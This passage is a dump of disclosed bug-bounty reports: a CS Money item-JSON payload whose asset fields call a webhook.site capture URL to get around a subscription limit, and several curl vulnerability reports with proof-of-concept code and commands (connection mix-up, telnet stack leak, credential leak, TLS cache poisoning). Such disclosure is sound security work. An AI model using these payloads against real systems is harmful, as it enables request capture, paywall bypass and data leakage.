_ym_visorc_62327980=w; _gat_UA-77178353-9=1; _gat_UA-77178353-1=1
12
13{""data"":{""_id"":""5ef6558b28c55325932ac431"",""defindex"":7,""paintindex"":282,""rarity"":5,""quality"":4,""paintwear"":1040943208,""paintseed"":1,""origin"":4,""dropreason"":null,""floatvalue"":0.13626253604888916,""is_stattrak"":false,""assetid"":""18947899176"",""uuid"":""qd8OqzS"",""stickers"":[],""time"":1593202059096,""__v"":0,""createdAt"":1600586351204,""updatedAt"":1600586351204,""item_name"":""AK-47"",""skin_name"":""Redline"",""wear_name"":""Minimal Wear"",""rarity_name"":""Classified"",""item_type"":""Rifle"",""quality_name"":""Unique"",""id"":""5ef6558b28c55325932ac431"",""paint"":{""name"":""cu_ak47_cobra"",""description_string"":""#PaintKit_cu_awp_cobra"",""description_tag"":""#PaintKit_cu_awp_cobra_tag"",""style"":""7"",""pattern"":""ElegantREDV1.1"",""pattern_scale"":""1.000000"",""phongexponent"":""150"",""phongintensity"":""10"",""ignore_weapon_size_scale"":""1"",""only_first_material"":""0"",""pattern_offset_x_start"":""0.000000"",""pattern_offset_x_end"":""0.000000"",""pattern_offset_y_start"":""0.000000"",""pattern_offset_y_end"":""0.000000"",""pattern_rotate_start"":""0.000000"",""pattern_rotate_end"":""0.000000"",""wear_remap_min"":""0.100000"",""wear_remap_max"":""0.700000""},""item"":{""name"":""weapon_ak47"",""prefab"":""statted_item_base"",""item_quality"":""unique"",""baseitem"":""1"",""default_slot_item"":""1"",""item_sub_position"":""rifle1"",""item_class"":""weapon_ak47"",""item_name"":""#SFUI_WPNHUD_AK47"",""item_description"":""#CSGO_Item_Desc_AK47"",""item_rarity"":""common"",""image_inventory"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""model_player"":""models/weapons/v_rif_ak47.mdl"",""model_world"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""model_dropped"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""icon_default_image"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""stickers"":{""0"":{""viewmodel_material"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""viewmodel_geometry"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""worldmodel_decal_pos"":""6.43516 -1.26887 -0.743033""},""1"":{""viewmodel_material"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""viewmodel_geometry"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""worldmodel_decal_pos"":""6.43516 -1.47404 3.01389""},""2"":{""viewmodel_material"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""viewmodel_geometry"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""worldmodel_decal_pos"":""6.43516 -1.34147 7.33494""},""3"":{""viewmodel_material"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""viewmodel_geometry"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""worldmodel_decal_pos"":""6.43516 -1.31489 11.8284""}},""used_by_classes"":{""terrorists"":""1""},""attributes"":{""magazine model"":""models/weapons/w_rif_ak47_mag.mdl"",""primary reserve ammo max"":""0"",""recovery time crouch"":""1.000000"",""recovery time crouch final"":""1.000000"",""recovery time stand"":""1.000000"",""recovery time stand final"":""1.000000"",""inaccuracy jump initial"":""0.000000"",""inaccuracy jump"":""0.000000"",""heat per shot"":""0.250000"",""addon scale"":""1.000000"",""tracer frequency"":""0"",""max player speed"":""1"",""is full auto"":""0"",""in game price"":""2700"",""armor ratio"":""1"",""crosshair delta distance"":""3"",""penetration"":""1.000000"",""damage"":""42"",""range"":""8192.000000"",""cycletime"":""0.150000"",""time to idle"":""2.000000"",""flinch velocity modifier large"":""1.000000"",""flinch velocity modifier small"":""1.000000"",""spread"":""0.000000"",""inaccuracy crouch"":""0.000000"",""inaccuracy stand"":""0.000000"",""inaccuracy land"":""0.000000"",""inaccuracy ladder"":""0.000000"",""inaccuracy fire"":""0.000000"",""inaccuracy move"":""0.000000"",""recoil angle"":""0.000000"",""recoil angle variance"":""0.000000"",""recoil magnitude"":""0.000000"",""recoil magnitude variance"":""0.000000"",""recoil seed"":""223"",""primary clip size"":""-1"",""weapon weight"":""0"",""rumble effect"":""-1"",""inaccuracy crouch alt"":""0.000000"",""inaccuracy fire alt"":""0.000000"",""inaccuracy jump alt"":""0.000000"",""inaccuracy ladder alt"":""0.000000"",""inaccuracy land alt"":""0.000000"",""inaccuracy move alt"":""0.000000"",""inaccuracy stand alt"":""0.000000"",""max player speed alt"":""1"",""recoil angle alt"":""0.000000"",""recoil angle variance alt"":""0.000000"",""recoil magnitude alt"":""0.000000"",""recoil magnitude variance alt"":""0.000000"",""spread alt"":""0.000000"",""stattrak model"":""models/weapons/stattrack.mdl"",""recovery transition start bullet"":""0"",""recovery transition end bullet"":""0"",""allow hand flipping"":""1"",""attack movespeed factor"":""1.000000"",""bot audible range"":""2000.000000"",""bullets"":""1"",""cannot shoot underwater"":""0"",""crosshair min distance"":""4"",""cycletime alt"":""0.300000"",""has burst mode"":""0"",""has silencer"":""0"",""hide view model zoomed"":""0"",""idle interval"":""20"",""inaccuracy jump apex"":""0.000000"",""inaccuracy reload"":""0.000000"",""inaccuracy pitch shift"":""0.000000"",""inaccuracy alt sound threshold"":""0.000000"",""is melee weapon"":""0"",""is revolver"":""0"",""itemflag select on empty"":""0"",""itemflag no auto reload"":""0"",""itemflag no auto switch empty"":""0"",""itemflag limit in world"":""0"",""itemflag exhaustible"":""0"",""itemflag do hit location dmg"":""0"",""itemflag no ammo pickups"":""0"",""itemflag no item pickup"":""0"",""kill award"":""300"",""model right handed"":""1"",""primary default clip size"":""-1"",""range modifier"":""0.980000"",""spread seed"":""0"",""secondary clip size"":""-1"",""secondary default clip size"":""-1"",""secondary reserve ammo max"":""0"",""unzoom after shot"":""0"",""zoom fov 1"":""90"",""zoom fov 2"":""90"",""zoom levels"":""0"",""zoom time 0"":""0"",""zoom time 1"":""0"",""zoom time 2"":""0""},""inventory_image_data"":{""camera_angles"":""2.0 -130.0 0.0"",""camera_offset"":""0.0 1.0 -2.0"",""camera_fov"":""35.000000"",""override_default_light"":""1"",""spot_light_key"":{""position"":""-120 120 180"",""color"":""2 2.1 2.3"",""lookat"":""0.0 0.0 0.0"",""inner_cone"":""0.500000"",""outer_cone"":""1.000000""},""spot_light_rim"":{""position"":""10.0 -90.0 -60.0"",""color"":""3 5 5"",""lookat"":""0.0 0.0 0.0"",""inner_cone"":""0.040000"",""outer_cone"":""0.500000""}},""paint_data"":{""paintablematerial0"":{""name"":""rif_ak47"",""origmat"":""ak47"",""viewmodeldim"":""2048"",""worlddim"":""512"",""basetextureoverride"":""0"",""weaponlength"":""37.746201"",""uvscale"":""0.549000"",""vmt"":{""baseTexture"":""rif_ak47/ak47"",""phong"":""1"",""phongboost"":""2"",""phongalbedoboost"":""35"",""phongfresnelranges"":""[.83 .83 1]"",""phongexponenttexture"":""rif_ak47/ak47_exponent"",""basemapalphaphongmask"":""1"",""envmap"":""env_cubemap"",""envmapfresnel"":""1"",""envmaptint"":""[.1 .1 .1]"",""phongalbedotint"":""1"",""phongdisablehalflambert"":""1""}}},""visuals"":{""muzzle_flash_effect_1st_person"":""weapon_muzzle_flash_assaultrifle"",""muzzle_flash_effect_3rd_person"":""weapon_muzzle_flash_assaultrifle"",""heat_effect"":""weapon_muzzle_smoke"",""addon_location"":""primary_rifle"",""eject_brass_effect"":""weapon_shell_casing_rifle"",""tracer_effect"":""weapon_tracers_assrifle"",""weapon_type"":""Rifle"",""player_animation_extension"":""ak"",""primary_ammo"":""BULLET_PLAYER_762MM"",""sound_single_shot"":""Weapon_AK47.Single"",""sound_nearlyempty"":""Default.nearlyempty""},""item_type_name"":""#CSGO_Type_Weapon"",""item_slot"":""rifle"",""inv_group_equipment"":""rifle"",""mouse_pressed_sound"":""weapons/m4a1/m4a1_clipout.wav"",""drop_sound"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""item_gear_slot"":""primary"",""item_gear_slot_position"":""0"",""capabilities"":{""nameable"":""1"",""paintable"":""1"",""can_sticker"":""1"",""can_stattrack_swap"":""1""},""craft_class"":""weapon"",""craft_material_type"":""weapon"",""min_ilevel"":""1"",""max_ilevel"":""1"",""image_inventory_size_w"":""128"",""image_inventory_size_h"":""82""},""stickerBase"":{""0"":{""aotexture"":""https://webhook.site/d0aef653-d8b8-4010-9810-72b277e8238c"",""wearremapmin"":""0.64"",""wearremapmid"":""1.0"",""wearremapmax"":""0.98"",""wearwidthmin"":""0.12"",""wearwidthmax"":""0.04"",""hlmvallowedit"":""1""},""1"":{""aotexture"":""rif_ak47/rif_ak47_decal_b"",""wearremapmin"":""0.58"",""wearremapmid"":""0.92"",""wearremapmax"":""0.98"",""wearwidthmin"":""0.12"",""wearwidthmax"":""0.04"",""hlmvallowedit"":""1""},""2"":{""aotexture"":""rif_ak47/rif_ak47_decal_c"",""wearremapmin"":""0.7"",""wearremapmid"":""0.86"",""wearremapmax"":""0.98"",""wearwidthmin"":""0.12"",""wearwidthmax"":""0.04"",""hlmvallowedit"":""1""},""3"":{""aotexture"":""rif_ak47/rif_ak47_decal_d"",""wearremapmin"":""0.74"",""wearremapmid"":""0.94"",""wearremapmax"":""0.98"",""wearwidthmin"":""0.12"",""wearwidthmax"":""0.04"",""hlmvallowedit"":""1""}}},""name"":""c1c"",""background"":""http://LINK_CUSTOM_BACKGROUND"",""parent"":""qd8OqzS"",""backgroundFilters"":{""Exposure"":50,""Contrast"":50,""Saturation"":50}}

Change the background parameter in json to the link of custom background you want

PoC
https://3d.cs.money/item/xALqKJVBdC
Impact
Bypass restrict of member subscription1 attachment:F999661: Screenshot_2.pngtriage_team CS Money staff  changed the status to Triaged. Sep 23rd (2 years ago)Hey!
Confirmed, fix will be today, max tomorrow.CS Money  rewarded khoabda1 with a $200 bounty. Sep 23rd (2 years ago)triage_team CS Money staff  closed the report and changed the status to Resolved. Sep 23rd (2 years ago)Fixed, please, validate.khoabda1   posted a comment. Sep 23rd (2 years ago)Hi @triage_team,
I confirmed it 500 Internal Server Error nowkhoabda1   posted a comment. Sep 24th (2 years ago)Hi @triage_team 
Can I ask for a free prime subscription for testing prime function?triage_team CS Money staff  posted a comment. Sep 24th (2 years ago)Hey!
First 5 days of prime is free for all first time.
You can simply activate it, and decline recurring payment in paypal immediately, so no money would be charged on the 5th day.khoabda1   requested to disclose this report. Sep 28th (2 years ago)triage_team CS Money staff  agreed to disclose this report. Sep 28th (2 years ago)  This report has been disclosed. Sep 28th (2 years ago)",https://hackerone.com/reports/989415,Washington,United States,Bellevue,2020,9,23,15,49
curl,1-10,1.0,under-1m,$500.00,Low,2.0,Information Disclosure,Connect-only connections can use the wrong connection,"m42a  submitted a report to curl.Jul 31st (2 years ago)Summary:
If a connect-only easy handle is not read from or written to, its connection can time out and be closed.  If a new connection is created it can be allocated at the same address, causing the easy handle to use the new connection.  This new connection may not be connected to the same server as the old connection, which can allow sensitive information intended to go to the first server to instead go to the second server.
This sequence of events would be uncommon in ordinary usage, so I have attached a sample program that implements a simple caching allocator, which causes the address to be re-used deterministically.
According to git bisect, this behavior was introduced in commit 755083d.
Steps To Reproduce:

Compile the source code below
Listen on ports 1234, 1235, and 1236
Run the compiled program
Notice that the data which was supposed to be sent to port 1234 is actually sent to port 1236

Supporting Material/References:
Code 4.84 KiBWrap lines Copy Download1#include <iostream>
2#include <stdexcept>
3#include <thread>
4#include <chrono>
5#include <unordered_map>
6
7#include <string.h>
8
9#include <curl/curl.h>
10
11using namespace std::literals;
12
13static void require(bool b)
14{
15	if (!b)
16		throw std::runtime_error(""Assertion failed"");
17}
18
19struct alloc
20{
21	alloc *next_alloc;
22	std::size_t size;
23};
24
25std::unordered_map<std::size_t, alloc *> cached_allocations;
26
27void *malloc_(size_t size)
28{
29	auto &ptr = cached_allocations[size];
30	if (ptr)
31	{
32		void *ret = (char *)ptr + sizeof(alloc);
33		ptr = ptr->next_alloc;
34		return ret;
35	}
36	auto new_ptr = (alloc *)calloc(1, size + sizeof(alloc));
37	new_ptr->next_alloc = nullptr;
38	new_ptr->size = size;
39	void *ret = ((char *)new_ptr) + sizeof(alloc);
40	return ret;
41}
42
43void free_(void *ptr)
44{
45	auto alloc_ptr = (alloc *)((char *)ptr - sizeof(alloc));
46	auto &last_alloc = cached_allocations[alloc_ptr->size];
47	alloc_ptr->next_alloc = last_alloc;
48	last_alloc = alloc_ptr;
49}
50
51void *realloc_(void *ptr, size_t size)
52{
53	auto alloc_ptr = (alloc *)((char *)ptr - sizeof(alloc));
54	auto new_alloc_ptr = (alloc *)realloc(alloc_ptr, size + sizeof(alloc));
55	new_alloc_ptr->size = size;
56	return (char *)new_alloc_ptr + sizeof(alloc);
57}
58
59char *strdup_(const char *str)
60{
61	auto size = strlen(str) + 1;
62	auto new_str = (char *)malloc(size);
63	return strcpy(new_str, str);
64}
65
66void *calloc_(size_t nmemb, size_t size)
67{
68	auto full_size = nmemb*size;
69	return malloc_(full_size);
70}
71
72
73int main()
74{
75	curl_global_init_mem(CURL_GLOBAL_DEFAULT, &malloc_, &free_, &realloc_, &strdup_, &calloc_);
76
77	auto multi = curl_multi_init();
78	require(multi);
79
80	auto easy1234 = curl_easy_init();
81	require(easy1234);
82	auto eret = curl_easy_setopt(easy1234, CURLOPT_URL, ""http://127.0.0.1:1234/"");
83	require(eret == CURLE_OK);
84	eret = curl_easy_setopt(easy1234, CURLOPT_CONNECT_ONLY, 1);
85	require(eret == CURLE_OK);
86	eret = curl_easy_setopt(easy1234, CURLOPT_VERBOSE, 1L);
87	require(eret == CURLE_OK);
88	eret = curl_easy_setopt(easy1234, CURLOPT_MAXAGE_CONN, 1L);
89	require(eret == CURLE_OK);
90	auto mret = curl_multi_add_handle(multi, easy1234);
91	require(mret == CURLM_OK);
92
93	// Create connection to port 1234
94	while (true)
95	{
96		int running;
97		mret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, &running);
98		require(mret == CURLM_OK);
99		int remaining;
100		if (auto info = curl_multi_info_read(multi, &remaining))
101		{
102			require(info->msg == CURLMSG_DONE);
103			require(info->easy_handle == easy1234);
104			require(info->data.result == CURLE_OK);
105			break;
106		}
107	}
108
109	// Allow connection to port 1234 to age out
110	std::this_thread::sleep_for(2s);
111
112	auto easy1235 = curl_easy_init();
113	require(easy1235);
114	eret = curl_easy_setopt(easy1235, CURLOPT_URL, ""http://127.0.0.1:1235/"");
115	require(eret == CURLE_OK);
116	eret = curl_easy_setopt(easy1235, CURLOPT_CONNECT_ONLY, 1);
117	require(eret == CURLE_OK);
118	eret = curl_easy_setopt(easy1235, CURLOPT_VERBOSE, 1L);
119	require(eret == CURLE_OK);
120	eret = curl_easy_setopt(easy1235, CURLOPT_MAXAGE_CONN, 1L);
121	require(eret == CURLE_OK);
122	mret = curl_multi_add_handle(multi, easy1235);
123	require(mret == CURLM_OK);
124
125	// Create connection to port 1235, then close connection to port 1234 as it is too old
126	while (true)
127	{
128		int running;
129		mret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, &running);
130		require(mret == CURLM_OK);
131		int remaining;
132		if (auto info = curl_multi_info_read(multi, &remaining))
133		{
134			require(info->msg == CURLMSG_DONE);
135			require(info->easy_handle == easy1235);
136			require(info->data.result == CURLE_OK);
137			break;
138		}
139	}
140
141	auto easy1236 = curl_easy_init();
142	require(easy1236);
143	eret = curl_easy_setopt(easy1236, CURLOPT_URL, ""http://127.0.0.1:1236/"");
144	require(eret == CURLE_OK);
145	eret = curl_easy_setopt(easy1236, CURLOPT_CONNECT_ONLY, 1);
146	require(eret == CURLE_OK);
147	eret = curl_easy_setopt(easy1236, CURLOPT_VERBOSE, 1L);
148	require(eret == CURLE_OK);
149	eret = curl_easy_setopt(easy1236, CURLOPT_MAXAGE_CONN, 1L);
150	require(eret == CURLE_OK);
151	mret = curl_multi_add_handle(multi, easy1236);
152	require(mret == CURLM_OK);
153
154	// Create connection to port 1236, which re-uses the memory of the previous connection to port 1234
155	while (true)
156	{
157		int running;
158		mret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, &running);
159		require(mret == CURLM_OK);
160		int remaining;
161		if (auto info = curl_multi_info_read(multi, &remaining))
162		{
163			require(info->msg == CURLMSG_DONE);
164			require(info->easy_handle == easy1236);
165			require(info->data.result == CURLE_OK);
166			break;
167		}
168	}
169
170	char c = 'a';
171	size_t n;
172	// Attempts to send data to port 1234, but actually uses the connection to port 1236
173	eret = curl_easy_send(easy1234, &c, 1, &n);
174	require(eret == CURLE_OK);
175
176	mret = curl_multi_remove_handle(multi, easy1236);
177	require(mret == CURLM_OK);
178	mret = curl_multi_remove_handle(multi, easy1235);
179	require(mret == CURLM_OK);
180	mret = curl_multi_remove_handle(multi, easy1234);
181	require(mret == CURLM_OK);
182	mret = curl_multi_cleanup(multi);
183	require(mret == CURLM_OK);
184}
Impact
This could cause sensitive data intended for one server to be transmitted to a different server.",https://hackerone.com/reports/948876,England,United Kingdom,London,2020,7,31,20,57
curl,1-10,1.0,under-1m,$800.00,Low,2.0,Business Logic Errors,CVE-2021-22897: schannel cipher selection surprise,"nyymi  submitted a report to curl.Apr 22nd (2 years ago)Summary:
Commit ""schannel: support selecting ciphers"" added support for selecting the ciphers with SCHANNEL. However, due to use of a static algIds array for ciphers in set_ssl_ciphers the last configured cipher list will override configuration used by other connections, leading to potential wrong configuration for them. This may have security implications if insecure cipher configuration is used where secure cipher configuration is expected.
Steps To Reproduce:
  1.Create two or more separate curl handles with curl_easy_init
2. Set different cipher lists with curl_easy_setopt CURLOPT_SSL_CIPHER_LIST to the curl handles
3. Create simultaneous connections with there the separate curl handles
Instead of each connection using the specific cipher list some of them will share the wrong configuration. If/how this happens exactly depends on how the connection setup overlaps.
Note that to be vulnerable some existing application using libcurl would needs to use such mixed CURLOPT_SSL_CIPHER_LIST configuration with multiple curl handles to begin with. It is not really known how likely this really is, but it seems somewhat rare use case.
Supporting Material/References:

Commit adding the vulnerable feature: https://github.com/curl/curl/commit/9aefbff30d280c60fc9d8cc3e0b2f19fc70a2f28

Impact
Potentially wrong cipher configuration used for connections.",https://hackerone.com/reports/1172857,England,United Kingdom,London,2021,4,22,22,39
curl,1-10,1.0,under-1m,"$2,000.00",High,7.95,Use After Free,CVE-2021-22901: TLS session caching disaster,"nyymi  submitted a report to curl.Apr 29th (2 years ago)Summary:
lib/vtls/openssl.c ossl_connect_step1 sets up the ossl_new_session_cb sessionid callback with  SSL_CTX_sess_set_new_cb, and adds association from data_idx and connectdata_idx to current conn and data respectively:
Code 167 BytesWrap lines Copy Download1  SSL_CTX_set_session_cache_mode(backend->ctx,
2      SSL_SESS_CACHE_CLIENT | SSL_SESS_CACHE_NO_INTERNAL);
3  SSL_CTX_sess_set_new_cb(backend->ctx, ossl_new_session_cb);
...
Code 118 BytesWrap lines Copy Download1      SSL_set_ex_data(backend->handle, data_idx, data);
2      SSL_set_ex_data(backend->handle, connectdata_idx, conn);
Whenever the ossl_new_session_cb callback is called the code fetches the conn and data associated  via:
Code 158 BytesWrap lines Copy Download1  conn = (struct connectdata*) SSL_get_ex_data(ssl, connectdata_idx);
2  if(!conn)
3    return 0;
4
5  data = (struct Curl_easy *) SSL_get_ex_data(ssl, data_idx);
However, it is possible that the connection is disassociated from these pointers via Curl_detach_connnection, and reassociated to a different connection via Curl_attach_connnection. Yet, Curl_detach_connnection doesn't SSL_set_ex_data the data_idx / connectdata_idx/ to NULL, nor does Curl_attach_connnection update the pointers with new ones. I am not absolutely certain but this appears to lead to a situation where a stale pointer(s) can exists when the session callback is called. 
Steps To Reproduce:
Unfortunately I currently have no easy to way reproduce this issue. I might attempt to do this later.
Notes
This issue is currently lacking information but includes what I believe is the potential root cause of the issue. This information might be wrong or lacking necessary details to make full determination of the validity of this issue at this time.
This issue seems to be occurring somewhat periodically when webkit browser is built with the libcurl backend. Typically this is a rare use case, I know of only Sony Playstation devices that use in larger scale.
Impact
Use after free, with potential for (remote(*)) code execution as ossl_new_session_cb calls Curl_ssl_sessionid_lock(data); with potentially repurposed memory. Attacker would need to control data->share pointer to attacker controller memory. This fake struct Curl_share would need to be crafted in a way that if(share->specifier & (1<<type)) is taken. share->lockfunc would then get called by the function, resulting in code execution.
*) caveat here, as it is unknown if external attacker can trigger this situation. It would be difficult, but cannot be completely ruled out.",https://hackerone.com/reports/1180380,England,United Kingdom,London,2021,4,29,20,31
curl,1-10,1.0,under-1m,$700.00,Medium,5.45,Business Logic Errors,CVE-2021-22922: Wrong content via metalink not discarded,"nyymi  submitted a report to curl.May 30th (about 1 year ago)Summary:
When compiled --with-libmetalink and used with --metalink curl does check the cryptographics hash of the downloaded files. However, the only indication that the hash was incorrect is a message displayed to the user. The files with incorrect hashes are left to the disk as-is.
Since curl implements the hash validation and reports incorrect hashes there might be an expectation that files with incorrect hashes would not be kept either. Since the metalink can be used with insecure protocols such as http and ftp, the hash validation might be used an actual way to verify the download integrity against tampering.
Steps To Reproduce:
  1.Configure libcurl --with-libmetalink and build libcurl
2. Have metalinktest.xml with <file name=""testfile""> containing incorrect sha-256 hash for it.
3. Execute: curl --metalink https://testsite/metalinktest.xml
The following message will be displayed:
Metalink: validating (testfile) [sha-256] FAILED (digest mismatch)
Yet, the downloaded file testfile with incorrect hash mismatch is kept.
Fix
It might be more sensible to download the file to a temporary name first, verify the hash and only then store the file to final name if the hash is correct. If hash mismatch is found remove the temporary file.
Impact
Modified or tampered files are kept and possibly incorrectly assumed valid",https://hackerone.com/reports/1213175,England,United Kingdom,London,2021,5,30,20,49
curl,1-10,1.0,under-1m,$700.00,Medium,5.45,Cleartext Transmission of Sensitive Information,CVE-2021-22923: Metalink download sends credentials,"nyymi  submitted a report to curl.May 30th (about 1 year ago)Summary:
When compiled --with-libmetalink and used with --metalink  and --user curl will use the credentials for any further transfers performed. This includes different hosts and protocols, even ones without transport layer security such as http and ftp. As a result the credentials only intended for the target site may end up being sent to outside hosts, and without transport layer security, and may be intercepted by attackers in man in the middle network position.
For example HTTP redirects will not leak the credentials to other hosts unless if  --location-trusted is used, thus this is unexpected and insecure behaviour.
Steps To Reproduce:

Configure libcurl --with-libmetalink and build libcurl
Have metalinktest.xml with <url> referencing data on different host than testsite and using http protocol
Execute: curl --metalink --user professor:Joshua  https://testsite/metalinktest.xml

The credentials can be seen by the target host and anyone in man in the middle position:
Authorization: Basic cHJvZmVzc29yOkpvc2h1YQ==
Remarks
CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) might be a more accurate CWE.
Fix

Perhaps --location-trusted should be extended to apply to --metalink as well

Impact
Leak of credentials to unauthorized parties§",https://hackerone.com/reports/1213181,England,United Kingdom,London,2021,5,30,21,32
curl,1-10,1.0,under-1m,"$1,200.00",High,7.1,Improper Input Validation,CVE-2021-22924: Bad connection reuse due to flawed path name checks,"nyymi  submitted a report to curl.Jun 11th (about 1 year ago)Summary:
Curl_ssl_config_matches attempts to compare whether two SSL connections have identical SSL security options or not. The idea is to avoid reusing a connection that uses less secure, or completely different security options such as capath, cainfo or certificate/issuer pinning.
Unfortunately this function has several flaws in it:

It completely fails to take into account ""BLOB"" type certificate values, such as set by CURLOPT_CAINFO_BLOB and  CURLOPT_ISSUERCERT_BLOB. If the application can be made to initiate connection to a user specified location (where these BLOB options are not used) before the ""more secure"" connection using these options is made, the attacker can point the application to connect to the same address and port, effectively poisoning the connection cache with a connection that has been established with different cainfo or issuecert settings. This leads to attacker being able to neutralize these options and make libcurl ignore them for the connections for which they're set. I have no obvious CWE number for this one, but CWE-664 Improper Control of a Resource Through its Lifetime might fit.
CURLOPT_ISSUERCERT value is not matched. Similar to above.
Similarly, the function has an implementation flaw where path names use case-insensitive comparison for capath, cainfo and pinned public key paths. This can lead to a  situation where if the attacker can specify the capath, cainfo or pinned public key name that have a different path capitalization. Again, if the attacker can specify some of these values for the connection that is performed before the later supposedly secure connection is made, the attacker is able to make the further connection use incorrect capath, cainfo or pinned public key. This is CWE-41 Improper Resolution of Path Equivalence.
Finally, the pinned public key fingerprint set by CURLOPT_PINNEDPUBLICKEY sha256// is incorrectly compared as case-insenstive  value. If the attacker is able to create a otherwise valid certificate that has a fingerprint that has the same fingerprint string but with different capitalization (very difficult to pull off in practice), and the application could be tricked to use this value for CURLOPT_PINNEDPUBLICKEY and create a connection, later connection could be confused to think that the pinned public key is the same one.

Exploiting any of these issues requires a situation where the attacker can coax the application to create a TLS connection to the same host and port that will be performed by the application itself later on (for example some backend connection or other high security connection the attacker wishes to man in the middle). In these situations the existing connection with less security guarantees may be reused, allowing man in the middle attacks against the later supposedly secure connection, resulting in loss of confidentiality and integrity. Since this requires an active attack it can't be thought to have direct availability impact. In most cases where this would result in exploitation would be scenarios where there would be a privilege barrier between the user providing the connection target addresses  (lower priority) and the libcurl using application performing the actual connections (higher priority). It can also be exploitable in a scenario where the attacker will try to man in the middle connections performed by other users of the same service (lateral attack towards users at the same privilege level).
Exploiting the first two issues is plausible in a situation where the attacker can obtain a valid certificate for the host, but from issuer that doesn't match what the application pinning will check for. If the app uses the blob variants to set up pinning and the attacker is able to obtain a certificate for the specific host from for example Let's Encrypt, the ""pin stripping"" attack would be plausible.
Exploiting the 3rd issue is be possible in a situation where the attacker can write to a location that has the same path but with a different capitalization. One example of such situation would be an application that uses a /tmp, /dev/shm or similar sticky world writable location to store the capath/cainfo/pinned public key file. The attacker would then be able to use the same location but with different file name capitalization to fool the application to reuse the existing connection for later connections that actually would use a different capath, cainfo or pinned public key. This attack requires that the attacker can provide the options for capath, cainfo or the public cert pinning somehow (the application would need to enable this as part of its normal functionality).
Steps To Reproduce:
This proof of concept demonstrates the 3rd issue with the curl tool:

cp /etc/ssl/certs/ca-certificates.crt ca.crt
touch CA.crt
curl --capath /dev/null --cacert $PWD/ca.crt  https://curl.se --next --capath /dev/null --cacert $PWD/CA.crt  https://curl.se

If Curl_ssl_config_matches comparison is implemented correctly the 2nd connection should fail.
Proposed Fix:
In Curl_ssl_config_matches:

Add ""blob"" binary matching for CURLOPT_CAINFO_BLOB and CURLOPT_ISSUERCERT_BLOB
Add case-sensitive matching for CURLOPT_ISSUERCERT value
Use case-sensitive matching for paths and public key cert signature(s)
Ensure that there are no other SSL parameters that are improperly compared or omitted from the equivalence check

Impact
TLS man in the middle",https://hackerone.com/reports/1223565,England,United Kingdom,London,2021,6,11,3,47
curl,1-10,1.0,under-1m,$800.00,Low,3.1,Information Disclosure,CVE-2021-22925: TELNET stack contents disclosure again,"thoger  submitted a report to curl.Jun 11th (about 1 year ago)Summary:
CVE-2021-22898: TELNET stack contents disclosure (#1176461) issue was recently reported for curl and it was addressed in curl 7.77.0:
https://curl.se/docs/CVE-2021-22898.html
https://github.com/curl/curl/commit/39ce47f219b09c380b81f89fe54ac586c8db6bde
https://hackerone.com/reports/1176461
However, the fix applied is not correct and does not completely address the issue.  It helps in cases when long environment variable name is used ('a'*256 + ',b'), but not when the name is short and only the value is long ('a,' + 'b'*256, which is the example mentioned in the curl project advisory).
Steps To Reproduce:
Follow the steps form #1176461, only use NEW_ENV option with short name and long value, such as:
Code 75 BytesWrap lines Copy Download1$ curl telnet://127.0.0.1:23 -t NEW_ENV=`python -c ""print('a,' + 'b'*256)""`
Supporting Material/References:
When parsing NEW_ENV option value with short name and long value, sscanf() returns 2, as it writes to both varname and varval, even though the data in varval is truncated.  Hence such variable is not skipped and is added to the temp[] buffer.  However, the len counter which tracks the amount of data that was already written to temp[] is not updated based on the data written to the buffer in the msnprintf()call, but rather based on the length of the original unparsed data that is stored in tmplen.  The relevant code is here:
https://github.com/curl/curl/blob/curl-7_77_0/lib/telnet.c#L926-L929
When value stored in varval is truncated, len is increased too much and a chunk of uninitialized memory is created in temp[].  The len should only be incremented by strlen(varname) + strlen(varval) + 2.
I wonder if the original fix should be preserved or re-worked.  In addition to not fixing the info leak problem properly, it also causes certain valid option values to be ignored and not sent to a server any more.  Rejected values are of the forms NEW_ENV=a or NEW_ENV=a,.  At least the second one seems like an obviously valid way to set variable a to an empty string.  RFC 1572 defines that environment variable can be sent with empty value and hence NEW_ENV=a, should remain supported.  It also defines that variable can be sent with no value, making NEW_ENV=a a valid option as well.  Note that curl prior to 7.77.0 actually did handle NEW_ENV=a that way, but it looks more like an unintended side effect of how len was incremented by tmplen, as the empty value part was written to temp[] and only subsequently overwritten.  As the telnet protocol support in curl is not likely to be used widely these days, possibly only to interact with some legacy systems, it seems reasonable to prefer a fix that changes behaviour as little as possible.
Impact
Leak of an uninitialized stack memory.
Report #1176461 and the matching curl advisory provide some estimates on how much data can be leaked.  I believe the amount of leaked data is smaller and is less than a half of the temp[] size.  The reason for that is in the check_telnet_options() where option arguments are truncated to 255 characters, and at least half of that must part of the defined variable name or value.
https://github.com/curl/curl/blob/curl-7_77_0/lib/telnet.c#L799-L800",https://hackerone.com/reports/1223882,England,United Kingdom,London,2021,6,11,12,15
curl,1-10,1.0,under-1m,"$1,000.00",Medium,4.0,Business Logic Errors,CVE-2021-22926: CURLOPT_SSLCERT mixup with Secure Transport,"nyymi  submitted a report to curl.Jun 15th (about 1 year ago)Summary:
libcurl Secure Transport SSL backend fails to secure the CURLOPT_SSLCERT against current directory file overriding the keychain nickname specified.
This leads to the possibility of locally created file overriding the CURLOPT_SSLCERT specified certificate and thus causing denial of service.
Steps To Reproduce:

Configure and build curl against Secure Transport: configure --with-secure-transport && make
Have keychain with client certificate called ""testcert""
Use testcert from keychain to authenticate: ./src/curl -E testcert https://testsite
In current directory execute touch testcert
Try authenticating again ./src/curl -E testcert https://testsite

